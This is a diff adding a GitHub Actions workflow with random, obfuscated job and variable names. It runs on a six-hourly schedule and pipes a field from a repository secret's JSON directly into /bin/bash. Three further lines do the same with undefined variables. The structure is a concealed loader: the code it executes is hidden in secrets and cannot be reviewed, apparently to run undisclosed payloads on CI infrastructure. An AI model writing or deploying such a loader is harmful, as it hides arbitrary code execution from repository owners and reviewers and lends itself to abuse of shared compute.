@@ -1,0 +1,20 @@
+name: maixiaoqi7465
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '40 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: maixiaoqi7465
+        env:
+          oq95621: ${{ secrets.oq95621 }}
+        run: |
+          echo $oq95621 | jq -r .xwql9393 | /bin/bash
+          echo $kwfpm8 | jq -r .d31096 | /bin/bash
+          echo $fwe7 | jq -r .jpe857 | /bin/bash
+          echo $q98 | jq -r .ricw511 | /bin/bash
+
